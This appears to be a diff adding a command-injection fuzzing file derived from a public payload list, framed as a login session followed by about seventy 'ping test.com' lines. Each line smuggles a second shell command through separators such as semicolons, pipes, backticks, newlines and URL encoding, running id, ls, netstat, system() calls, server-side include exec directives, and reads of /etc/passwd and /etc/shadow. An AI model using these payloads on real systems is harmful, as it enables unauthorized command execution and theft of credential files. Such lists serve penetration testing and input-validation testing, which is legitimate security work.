@@ -1,0 +1,74 @@
+# source: https://github.com/ismailtasdelen/command-injection-payload-list
+login Acidburn
+pass CrashOverride
+ping test.com -c 1;&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+ping test.com -c 1;&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+ping test.com -c 1;&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+ping test.com -c 1;&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+ping test.com -c 1;/index.html|id|
+ping test.com -c 1;;id;
+ping test.com -c 1;;id
+ping test.com -c 1;;netstat -a;
+ping test.com -c 1;;id;
+ping test.com -c 1;|id
+ping test.com -c 1;|/usr/bin/id
+ping test.com -c 1;|id|
+ping test.com -c 1;|/usr/bin/id|
+ping test.com -c 1;||/usr/bin/id|
+ping test.com -c 1;|id;
+ping test.com -c 1;||/usr/bin/id;
+ping test.com -c 1;;id|
+ping test.com -c 1;;|/usr/bin/id|
+ping test.com -c 1;\n/bin/ls -al\n
+ping test.com -c 1;\n/usr/bin/id\n
+ping test.com -c 1;\nid\n
+ping test.com -c 1;\n/usr/bin/id;
+ping test.com -c 1;\nid;
+ping test.com -c 1;\n/usr/bin/id|
+ping test.com -c 1;\nid|
+ping test.com -c 1;;/usr/bin/id\n
+ping test.com -c 1;;id\n
+ping test.com -c 1;|usr/bin/id\n
+ping test.com -c 1;|nid\n
+ping test.com -c 1;`id`
+ping test.com -c 1;`/usr/bin/id`
+ping test.com -c 1;a);id
+ping test.com -c 1;a;id
+ping test.com -c 1;a);id;
+ping test.com -c 1;a;id;
+ping test.com -c 1;a);id|
+ping test.com -c 1;a;id|
+ping test.com -c 1;a)|id
+ping test.com -c 1;a|id
+ping test.com -c 1;a)|id;
+ping test.com -c 1;a|id
+ping test.com -c 1;|/bin/ls -al
+ping test.com -c 1;a);/usr/bin/id
+ping test.com -c 1;a;/usr/bin/id
+ping test.com -c 1;a);/usr/bin/id;
+ping test.com -c 1;a;/usr/bin/id;
+ping test.com -c 1;a);/usr/bin/id|
+ping test.com -c 1;a;/usr/bin/id|
+ping test.com -c 1;a)|/usr/bin/id
+ping test.com -c 1;a|/usr/bin/id
+ping test.com -c 1;a)|/usr/bin/id;
+ping test.com -c 1;a|/usr/bin/id
+ping test.com -c 1;;system('cat%20/etc/passwd')
+ping test.com -c 1;;system('id')
+ping test.com -c 1;;system('/usr/bin/id')
+ping test.com -c 1;%0Acat%20/etc/passwd
+ping test.com -c 1;%0A/usr/bin/id
+ping test.com -c 1;%0Aid
+ping test.com -c 1;%0A/usr/bin/id%0A
+ping test.com -c 1;%0Aid%0A
+ping test.com -c 1;& ping -i 30 127.0.0.1 &
+ping test.com -c 1;& ping -n 30 127.0.0.1 &
+ping test.com -c 1;%0a ping -i 30 127.0.0.1 %0a
+ping test.com -c 1;`ping 127.0.0.1`
+ping test.com -c 1;| id
+ping test.com -c 1;& id
+ping test.com -c 1;; id
+ping test.com -c 1;%0a id %0a
+ping test.com -c 1;`id`
+ping test.com -c 1;$;/usr/bin/id
+exit
